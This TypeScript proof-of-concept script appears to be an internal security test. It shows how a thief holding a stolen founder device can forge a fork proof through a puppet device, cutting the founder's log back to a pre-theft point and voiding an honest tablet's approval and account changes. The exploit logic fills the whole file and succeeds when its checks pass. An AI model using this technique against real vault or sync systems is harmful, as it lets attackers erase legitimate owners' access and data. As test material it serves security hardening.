// @ts-nocheck PoC script, run as is by vaultRound6.test.ts
// R6-A: a puppet that is NOT standing in the final state still "contests" a fork (decideWithForks
// accumulates `contested` across rounds, from round 0 where fork cuts are MAX). A thief uses it to
// cut its own log back to an OLD, pre-theft seq, voiding the approval of the owner's honest tablet N
// and every account change N ever made. All lines go through the honest agent (planAppend).
// PASS = the attack worked.
import { addDevice, agentAppend, build, check, dev, entry, found, now, open, put, random, rec, st, status, summary, ser } from './lib.ts';

const F = dev(); // founder phone, later stolen
const N = dev(); // owner's honest tablet, approved long before the theft
const P = dev(); // thief's puppet
const v = found(F);
const { vaultId, logs } = v;
const names = { [F.deviceId]: 'F', [N.deviceId]: 'N', [P.deviceId]: 'P' };

// Pre-theft: F approves N (F#1); N joins and adds accounts.
addDevice(vaultId, logs, F, N, 'admin', 'tablet');
const accts: any[] = [];
for (let i = 0; i < 3; i++) {
  const s = st(vaultId, logs);
  const e = build.buildAccountPut(s, N, { account: build.newAccountId(random), record: rec(`Bank${i}`), currentKey: open.openVault(s, N).currentKey, random, time: now() });
  agentAppend(vaultId, logs, [e]);
  accts.push(e);
}
const f1 = JSON.parse(logs[F.deviceId]![1]!);
console.log('before theft:', summary(st(vaultId, logs), names));

// Theft, before the owner notices: approve puppet P (F#2) through the agent; P joins.
{
  const s = st(vaultId, logs);
  const add = build.buildDeviceAdd(s, F, { device: P, role: 'admin', name: 'p', currentKey: open.openVault(s, F).currentKey, random, time: now() });
  agentAppend(vaultId, logs, [add]);
  agentAppend(vaultId, logs, [build.buildDeviceHello(st(vaultId, logs), P, now())]);
}

// Thief signs an alternative F#1' on its copy as it was at seq 0.
const old = st(vaultId, { [F.deviceId]: [logs[F.deviceId]![0]!] });
const f1alt = build.buildAccountPut(old, F, { account: build.newAccountId(random), record: rec('x'), currentKey: v.key, random, time: now() });
console.log('F#1 alt is seq', f1alt.seq, 'differs from folder F#1:', entry.entryHash(f1alt) !== entry.entryHash(f1));

// P#1: an ordinary account.put whose `seen` also names F#1' (P is the thief's, it signs what it likes).
{
  const s = st(vaultId, logs);
  const base = build.buildAccountPut(s, P, { account: build.newAccountId(random), record: rec('p'), currentKey: open.openVault(s, P).currentKey, random, time: now() });
  const { sig, ...unsigned } = base as any;
  unsigned.seen = { ...unsigned.seen, [F.deviceId]: { seq: 1, hash: entry.entryHash(f1alt) } };
  const p1 = entry.signEntry(unsigned, P);
  const plan = agentAppend(vaultId, logs, [p1]);
  console.log('agent took P#1:', plan.changed.length > 0, 'status', status(plan.state, p1));
}

// The thief publishes the fork proof (vault.forks.write checks only the two signatures).
const forks = [{ deviceId: F.deviceId, seq: 1, lines: [ser(f1), ser(f1alt)] as [string, string] }];
const s = (await import(new URL('../../../src/vault/replay.ts', import.meta.url).href)).replayVault(vaultId, logs, { forks });
console.log('after proof:', summary(s, names), 'cutoffs', s.cutoffs, 'forked', s.forked);
console.log('F#1 device.add N:', status(s, f1));
for (const a of accts) console.log('N account.put:', status(s, a));
const pIn = s.members[P.deviceId] && !s.members[P.deviceId].removed && s.members[P.deviceId].joined;
check('the puppet that contested is not standing at the end', !pIn);
check('N (approved pre-theft at F#1) is out / never joined', !s.members[N.deviceId] || !s.members[N.deviceId].joined || s.members[N.deviceId].removed);
check('all of N\'s account changes rejected', accts.every((a) => status(s, a).startsWith('rejected')));
check('none of N\'s changes are offered for review (caught)', s.history.filter((h: any) => h.author === N.deviceId && h.caught).length === 0);
check('vault lost N\'s accounts', Object.keys(s.accounts).length === 0, `accounts left: ${Object.keys(s.accounts).length}`);
